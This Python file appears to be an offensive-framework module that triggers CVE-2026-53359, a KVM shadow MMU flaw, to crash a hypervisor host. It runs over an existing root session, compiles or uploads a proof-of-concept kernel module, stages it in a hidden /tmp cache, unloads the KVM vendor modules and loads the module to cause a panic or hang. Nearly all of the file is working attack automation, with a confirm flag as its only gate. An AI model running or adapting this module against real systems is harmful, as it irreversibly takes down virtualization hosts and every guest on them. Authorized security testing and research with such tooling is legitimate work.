#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""KVM/x86 host DoS via shadow MMU role mismatch (CVE-2026-53359)."""

from __future__ import annotations

import os
import platform
import shlex
import shutil
import subprocess
import tempfile
from pathlib import Path

from kittysploit import *
from core.lib.compiler.zig_compiler import ZigCompiler
from lib.post.linux.system import System
from lib.post.linux.session import LinuxSessionMixin

_KBUILD_MAKEFILE = "obj-m += poc.o\n"


class Module(Post, System, LinuxSessionMixin):
    __info__ = {
        "name": "KVM Shadow MMU Host DoS (CVE-2026-53359)",
        "description": (
            "Triggers CVE-2026-53359 from a nested VMX/EPT or SVM/NPT context on a KVM "
            "hypervisor host. Builds or reuses poc.ko, unloads kvm_intel/kvm_amd, then "
            "insmods the PoC. This is a denial-of-service — it does not grant a new session."
        ),
        "author": ["Hyunwoo Kim (@v4bel)", "KittySploit Team"],
        "cve": ["CVE-2026-53359"],
        "platform": [Platform.LINUX],
        "arch": [Arch.X64],
        "session_type": [SessionType.SHELL, SessionType.SSH],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-53359",
        ],
        "tags": ["kvm", "hypervisor", "dos", "kernel", "manage"],
        "agent": {
            "risk": "intrusive",
            "effects": ["denial_of_service"],
            "expected_requests": 3,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 2.0,
            "noise": 1.0,
            "value": 0.5,
            "requires": {
                "capabilities_any": ["shell"],
                "capabilities_all": [],
            },
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    remote_ko = OptString(
        "/tmp/.ks_kvm53359/poc.ko",
        "Remote path for poc.ko (build dir inferred from parent)",
        required=True,
    )
    amd = OptChoice(
        "auto",
        "Backend: auto (CPU detect), 0 = Intel VMX/EPT, 1 = AMD SVM/NPT",
        required=False,
        choices=["auto", "0", "1"],
    )
    nvcpu = OptInteger(8, "Number of kthreads (1 writer + faulters)", required=False)
    dwell = OptInteger(256, "Writer spin dwell between PTE flips", required=False)
    run_ms = OptInteger(
        600000,
        "Writer deadline in ms (0 = run until manual rmmod)",
        required=False,
    )
    diag = OptInteger(1, "Diagnostic verbosity (0-2)", required=False)
    nflood = OptInteger(0, "Intel-only EPT flood threads", required=False)
    unload_kvm = OptBool(True, "rmmod kvm_intel/kvm_amd (and kvm) before insmod", required=False)
    use_remote_cache = OptBool(
        True,
        "Reuse poc.ko cached on target for this kernel release (skip upload/build)",
        required=False,
    )
    clear_cache = OptBool(False, "Delete remote poc.ko cache for this kernel before run", required=False)
    cleanup = OptBool(True, "rmmod poc after trigger (cache is kept unless CLEAR_CACHE)", required=False)
    monitor_s = OptInteger(30, "Seconds to wait for dmesg after insmod (0 = skip)", required=False)
    confirm = OptBool(False, "Confirm intentional host DoS", required=True)

    @staticmethod
    def _repo_root() -> Path:
        return Path(__file__).resolve().parents[5]

    def _exploit_dir(self) -> Path:
        return self._repo_root() / "data" / "exploits" / "CVE-2026-53359"

    @staticmethod
    def _as_bool(value) -> bool:
        if isinstance(value, bool):
            return value
        return str(value).strip().lower() in ("1", "true", "yes", "y", "on")

    def _opt_int(self, val, default: int, minimum: int | None = None) -> int:
        return self.linux_int_opt(val, default, minimum)

    def _target_kernel_release(self) -> str:
        return (self.linux_execute("uname -r 2>/dev/null", pty=False) or "").strip()

    def _amd_value(self) -> int:
        raw = self.amd
        if hasattr(raw, "value"):
            raw = raw.value
        choice = str(raw or "auto").strip().lower()
        if choice in ("1", "true", "yes", "amd"):
            return 1
        if choice in ("0", "false", "no", "intel"):
            return 0
        return self._detect_amd_cpu()

    def _detect_amd_cpu(self) -> int:
        vendor = (
            self.linux_execute(
                "grep -m1 -i vendor /proc/cpuinfo 2>/dev/null | cut -d: -f2",
                pty=False,
            )
            or ""
        ).strip().lower()
        if "amd" in vendor or "authenticamd" in vendor.replace(" ", ""):
            return 1
        flags = (self.linux_execute("grep -m1 flags /proc/cpuinfo 2>/dev/null", pty=False) or "").lower()
        if " svm " in f" {flags} " or flags.endswith(" svm") or " svm" in flags:
            return 1
        if " vmx " in f" {flags} " or " vmx" in flags:
            return 0
        print_warning("Could not detect CPU vendor from /proc/cpuinfo; defaulting to Intel (amd=0).")
        return 0

    def _kvm_vendor_module(self, amd_val: int) -> str:
        return "kvm_amd" if amd_val else "kvm_intel"

    def _has_kernel_headers(self, kver: str | None = None) -> bool:
        if kver:
            q = shlex.quote(kver)
            out = self.linux_execute(
                f"test -d /lib/modules/{q}/build && echo OK || echo MISSING",
                pty=False,
            )
        else:
            out = self.linux_execute(
                "KVER=$(uname -r); test -d /lib/modules/$KVER/build && echo OK || echo MISSING",
                pty=False,
            )
        return "OK" in (out or "")

    def _cpu_has_virt(self, amd_val: int) -> bool:
        if amd_val:
            out = self.linux_execute(
                "grep -E '(^| )svm( |$)' /proc/cpuinfo >/dev/null 2>&1 && echo OK || echo NO",
                pty=False,
            )
        else:
            out = self.linux_execute(
                "grep -E '(^| )vmx( |$)' /proc/cpuinfo >/dev/null 2>&1 && echo OK || echo NO",
                pty=False,
            )
        return "OK" in (out or "")

    def _prebuilt_ko(self, kver: str) -> Path | None:
        path = self._exploit_dir() / "prebuilt" / kver / "poc.ko"
        return path if path.is_file() else None

    def _local_kdir(self, kver: str) -> Path | None:
        kdir = Path(f"/lib/modules/{kver}/build")
        return kdir if kdir.is_dir() else None

    def _kbuild_local_zig(self, kver: str) -> bytes | None:
        if platform.system().lower() == "windows":
            return None
        kdir = self._local_kdir(kver)
        if not kdir:
            return None
        poc_src = self._exploit_dir() / "poc.c"
        if not poc_src.is_file():
            return None
        compiler = ZigCompiler()
        if not compiler.is_available():
            return None
        zig_cc = f"{compiler.zig_path} cc -target x86_64-linux-gnu -fno-sanitize=all"
        with tempfile.TemporaryDirectory(prefix="ks_kvm53359_") as tmp:
            work = Path(tmp)
            shutil.copy2(poc_src, work / "poc.c")
            (work / "Makefile").write_text(_KBUILD_MAKEFILE, encoding="utf-8")
            print_status(f"Local kbuild with Zig CC for kernel {kver}...")
            try:
                result = subprocess.run(
                    ["make", "-C", str(kdir), f"M={work}", f"CC={zig_cc}", "modules"],
                    capture_output=True,
                    text=True,
                    timeout=180,
                    cwd=str(work),
                )
            except Exception as exc:
                print_warning(f"Local Zig kbuild failed: {exc}")
                return None
            ko = work / "poc.ko"
            if result.returncode != 0 or not ko.is_file():
                err = (result.stderr or result.stdout or "").strip()
                if err:
                    print_warning(f"Local Zig kbuild: {err[:400]}")
                return None
            data = ko.read_bytes()
            print_success(f"Built poc.ko locally with Zig ({len(data)} bytes, kver={kver}).")
            return data

    def _resolve_poc_ko(self, kver: str, *, build: bool = True) -> tuple[bytes | None, str]:
        prebuilt = self._prebuilt_ko(kver)
        if prebuilt:
            if build:
                data = prebuilt.read_bytes()
                print_success(f"Using prebuilt poc.ko ({len(data)} bytes, kver={kver}).")
                return data, "prebuilt"
            return None, "prebuilt"

        if self._local_kdir(kver) and ZigCompiler().is_available():
            if build:
                local = self._kbuild_local_zig(kver)
                if local:
                    return local, "local_zig"
            else:
                return None, "local_zig"

        return None, "remote"

    def _cache_root(self, remote_ko: str) -> str:
        base = os.path.dirname(remote_ko) or "/tmp/.ks_kvm53359"
        return f"{base.rstrip('/')}/cache"

    def _cache_ko_path(self, remote_ko: str, kver: str) -> str:
        qkver = kver.replace("/", "_")
        return f"{self._cache_root(remote_ko)}/{qkver}/poc.ko"

    def _remote_cache_valid(self, cache_ko: str, kver: str) -> bool:
        qko = shlex.quote(cache_ko)
        qkver = shlex.quote(kver)
        qstamp = shlex.quote(f"{cache_ko}.kver")
        out = self.linux_execute(
            f"test -s {qko} && test -f {qstamp} && "
            f"[ \"$(cat {qstamp} 2>/dev/null)\" = {qkver} ] && echo OK || echo MISS",
            pty=False,
        )
        return "OK" in (out or "")

    def _stamp_remote_cache(self, cache_ko: str, kver: str) -> None:
        qstamp = shlex.quote(f"{cache_ko}.kver")
        qkver = shlex.quote(kver)
        self.linux_execute(f"printf '%s' {qkver} > {qstamp}", pty=False)

    def _save_to_remote_cache(self, cache_ko: str, kver: str, *, src_ko: str | None = None, data: bytes | None = None) -> bool:
        cache_dir = os.path.dirname(cache_ko)
        qdir = self.linux_shell_quote(cache_dir)
        self.linux_execute(f"mkdir -p {qdir}", pty=False)
        if data is not None:
            if not self.linux_upload_bytes(data, cache_ko, pty=False):
                return False
        elif src_ko:
            qsrc = shlex.quote(src_ko)
            qdst = shlex.quote(cache_ko)
            self.linux_execute(f"cp -f {qsrc} {qdst}", pty=False)
            if not self.linux_file_exists(cache_ko):
                return False
        else:
            return False
        self._stamp_remote_cache(cache_ko, kver)
        size = self.linux_remote_file_size(cache_ko)
        print_success(f"Cached poc.ko on target ({size} bytes, kver={kver}).")
        return True

    def _copy_remote_ko(self, src_ko: str, dst_ko: str) -> bool:
        if os.path.normpath(src_ko) == os.path.normpath(dst_ko):
            return self.linux_file_exists(src_ko)
        qsrc = shlex.quote(src_ko)
        qdst = shlex.quote(dst_ko)
        qdstdir = shlex.quote(os.path.dirname(dst_ko) or ".")
        self.linux_execute(f"mkdir -p {qdstdir}", pty=False)
        self.linux_execute(f"cp -f {qsrc} {qdst}", pty=False)
        return self.linux_file_exists(dst_ko)

    def _clear_remote_cache(self, remote_ko: str, kver: str) -> None:
        cache_ko = self._cache_ko_path(remote_ko, kver)
        qdir = shlex.quote(os.path.dirname(cache_ko))
        self.linux_execute(f"rm -rf {qdir}", pty=False)
        print_status(f"Remote cache cleared for kernel {kver}.")

    def _ensure_poc_ko(self, remote_ko: str, kver: str) -> tuple[bool, str]:
        cache_ko = self._cache_ko_path(remote_ko, kver)
        remote_dir = os.path.dirname(remote_ko) or "/tmp/.ks_kvm53359"

        if self._as_bool(self.clear_cache):
            self._clear_remote_cache(remote_ko, kver)

        if self._as_bool(self.use_remote_cache) and self._remote_cache_valid(cache_ko, kver):
            size = self.linux_remote_file_size(cache_ko)
            print_success(f"Remote cache hit ({size} bytes, kver={kver}).")
            if self._copy_remote_ko(cache_ko, remote_ko):
                return True, "remote_cache"
            print_warning("Remote cache copy failed; rebuilding.")

        ko_bytes, build_mode = self._resolve_poc_ko(kver, build=True)
        if ko_bytes is not None:
            if not self._save_to_remote_cache(cache_ko, kver, data=ko_bytes):
                print_warning("Could not write remote cache; uploading to run path only.")
                if not self.linux_upload_bytes(ko_bytes, remote_ko, pty=False):
                    return False, build_mode
            elif not self._copy_remote_ko(cache_ko, remote_ko):
                return False, build_mode
            return True, build_mode

        built_ko = f"{remote_dir.rstrip('/')}/poc.ko"
        if not self._build_on_target(remote_dir, kver):
            return False, "remote"
        if not self._save_to_remote_cache(cache_ko, kver, src_ko=built_ko):
            print_warning("Remote build succeeded but cache write failed.")
        if not self._copy_remote_ko(built_ko, remote_ko):
            return False, "remote"
        return True, "remote"

    def _build_on_target(self, remote_dir: str, kver: str) -> bool:
        poc_src = self._exploit_dir() / "poc.c"
        if not poc_src.is_file():
            print_error(f"Missing bundled source: {poc_src}")
            return False

        qdir = self.linux_shell_quote(remote_dir)
        self.linux_execute(f"mkdir -p {qdir}", pty=False)

        remote_c = f"{remote_dir.rstrip('/')}/poc.c"
        print_status(f"Uploading poc.c ({poc_src.stat().st_size} bytes)...")
        if not self.linux_upload_bytes(poc_src.read_bytes(), remote_c, pty=False):
            return False

        qkver = shlex.quote(kver)
        print_status("Remote kbuild (target kernel headers)...")
        out = self.linux_execute(
            f"cd {qdir} && "
            f"printf '%s' {shlex.quote(_KBUILD_MAKEFILE)} > Makefile && "
            f"make -C /lib/modules/{qkver}/build M={qdir} modules 2>&1",
            timeout=300,
            pty=False,
        )
        if out:
            print_info(out)
        ko_path = f"{remote_dir.rstrip('/')}/poc.ko"
        if not self.linux_file_exists(ko_path):
            print_error("Remote build failed — poc.ko not found.")
            return False
        print_success(f"Built poc.ko on target ({self.linux_remote_file_size(ko_path)} bytes).")
        return True

    def _unload_kvm_modules(self, amd_val: int) -> bool:
        kvm_mod = self._kvm_vendor_module(amd_val)
        print_status(f"Unloading {kvm_mod} (and kvm if present)...")
        for cmd in (
            f"modprobe -r {kvm_mod} 2>&1",
            "modprobe -r kvm 2>&1",
            f"rmmod {kvm_mod} 2>&1",
            "rmmod kvm 2>&1",
        ):
            out = self.linux_execute(cmd, pty=False)
            if out and "not found" not in out.lower() and "not currently loaded" not in out.lower():
                print_info(out.strip())

        lsmod = self.linux_execute("lsmod 2>/dev/null", pty=False) or ""
        if kvm_mod in lsmod:
            print_error(
                f"{kvm_mod} is still loaded. Stop all VMs and unload KVM manually, then retry."
            )
            return False
        print_success(f"{kvm_mod} unloaded.")
        return True

    def _insmod_params(self, amd_val: int) -> str:
        parts = []
        if amd_val:
            parts.append("amd=1")
        parts.extend(
            [
                f"nvcpu={self._opt_int(self.nvcpu, 8, minimum=1)}",
                f"dwell={self._opt_int(self.dwell, 256, minimum=0)}",
                f"run_ms={self._opt_int(self.run_ms, 600000, minimum=0)}",
                f"diag={self._opt_int(self.diag, 1, minimum=0)}",
                f"nflood={self._opt_int(self.nflood, 0, minimum=0)}",
            ]
        )
        return " ".join(parts)

    def check(self):
        if not self.linux_require_linux():
            return False
        if not self._as_bool(self.confirm):
            print_error("Refusing host DoS without confirm=true")
            return False

        arch = (self.linux_execute("uname -m 2>/dev/null", pty=False) or "").strip().lower()
        if arch not in ("x86_64", "amd64"):
            print_error(f"Architecture {arch or 'unknown'} is not supported (need x86_64).")
            return False

        if not self.linux_is_root():
            print_error("Root privileges are required (insmod/rmmod kernel modules).")
            return False

        if not (self._exploit_dir() / "poc.c").is_file():
            print_error(f"Missing bundled source: {self._exploit_dir() / 'poc.c'}")
            return False

        kver = self._target_kernel_release()
        if not kver:
            print_error("Could not read target kernel release (uname -r).")
            return False

        amd_val = self._amd_value()
        backend = "SVM/NPT (AMD)" if amd_val else "VMX/EPT (Intel)"
        if not self._cpu_has_virt(amd_val):
            print_error(f"CPU lacks {'SVM' if amd_val else 'VMX'} for backend {backend}.")
            return False

        ko_bytes, build_mode = self._resolve_poc_ko(kver, build=False)
        cache_note = ""
        if self._as_bool(self.use_remote_cache):
            cache_ko = self._cache_ko_path(str(self.remote_ko).strip() or "/tmp/.ks_kvm53359/poc.ko", kver)
            if self._remote_cache_valid(cache_ko, kver):
                cache_note = " (remote cache available)"
        if (
            ko_bytes is None
            and build_mode == "remote"
            and not cache_note
            and not self._has_kernel_headers(kver)
        ):
            print_error(
                f"No prebuilt poc.ko for {kver}, local Zig build unavailable, remote cache "
                f"missing, and target lacks /lib/modules/{kver}/build. Install "
                f"linux-headers-{kver} or add "
                f"data/exploits/CVE-2026-53359/prebuilt/{kver}/poc.ko"
            )
            return False
        if ko_bytes is None and build_mode == "remote" and not cache_note and not self.linux_command_exists("make"):
            print_error("make is required for remote kbuild on the target.")
            return False

        if build_mode == "remote" and not cache_note:
            print_status(f"Will build poc.ko on target for kernel {kver}.")
        elif cache_note:
            print_status(f"poc.ko will be reused from remote cache (kernel {kver}).")
        else:
            print_status(f"poc.ko ready via {build_mode} (kernel {kver}).")

        kvm_mod = self._kvm_vendor_module(amd_val)
        lsmod = self.linux_execute("lsmod 2>/dev/null", pty=False) or ""
        if kvm_mod in lsmod:
            print_warning(
                f"{kvm_mod} is loaded — module will rmmod it before insmod "
                "(stop running VMs first or unload may fail)."
            )

        print_warning(
            "Host DoS only — expect panic, hang, or lost session. "
            "No UMH/code-exec primitive: reverse_shell payload does not apply (unlike CVE-2026-46316/64561 escapes)."
        )
        print_status(
            "You already need root on the KVM host for insmod; this module does not open a new session."
        )
        return True

    def run(self):
        if not self.check():
            return False

        amd_val = self._amd_value()
        backend = "SVM/NPT" if amd_val else "VMX/EPT"
        kver = self._target_kernel_release()
        remote_ko = str(self.remote_ko).strip() or "/tmp/.ks_kvm53359/poc.ko"

        print_status(f"CVE-2026-53359 host DoS (backend={backend}, kver={kver})...")

        ok, source = self._ensure_poc_ko(remote_ko, kver)
        if not ok:
            return False
        if source != "remote_cache":
            print_status(f"poc.ko staged from {source}.")

        if self._as_bool(self.unload_kvm):
            if not self._unload_kvm_modules(amd_val):
                return False

        params = self._insmod_params(amd_val)
        insmod_cmd = f"insmod {shlex.quote(remote_ko)} {params}".strip()
        print_warning(f"Triggering host DoS: {insmod_cmd}")

        monitor = self._opt_int(self.monitor_s, 30, minimum=0)
        timeout = max(monitor + 10, 60) if monitor else 120
        out = self.linux_execute(insmod_cmd, timeout=timeout, pty=False)
        if out:
            print_info(out)

        if monitor > 0:
            dmesg = self.linux_execute(
                f"sleep {monitor}; dmesg | tail -n 80",
                timeout=monitor + 30,
                pty=False,
            )
            if dmesg:
                print_info(dmesg)

        if self._as_bool(self.cleanup):
            self.linux_execute("rmmod poc 2>/dev/null", pty=False)
            print_status("Cleanup attempted (rmmod poc; remote cache preserved).")

        print_success(
            "DoS trigger sent. Session may drop — check host console or hypervisor panel."
        )
        return True
